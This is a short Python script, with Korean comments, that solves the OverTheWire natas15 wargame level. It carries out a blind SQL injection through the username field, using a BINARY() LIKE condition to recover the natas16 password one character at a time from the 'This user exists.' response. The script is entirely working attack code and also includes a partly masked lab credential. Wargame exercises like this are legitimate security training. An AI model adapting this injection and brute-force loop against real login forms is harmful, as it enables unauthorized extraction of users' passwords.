from requests import request as req

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = ("natas15", "Sd...vx")


def request(answer: str):
    res = req(
        url=url,
        method="POST",
        auth=auth,
        # LIKE에서 대소문자 구분을 안하는 것을 BINARY()를 통해 구분하게 변경
        data={"username": f'natas16" AND BINARY(password) LIKE "{answer}%'},
    )

    return res.text


def main():
    # 비밀번호 후보
    candidate = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

    answer = ""
    # 비밀번호 자리수 만큼 반복
    for _ in range(32):
        for c in candidate:
            print(answer + c)
            res = request(answer + c)
            if "This user exists." in res:
                answer += c
                break


main()
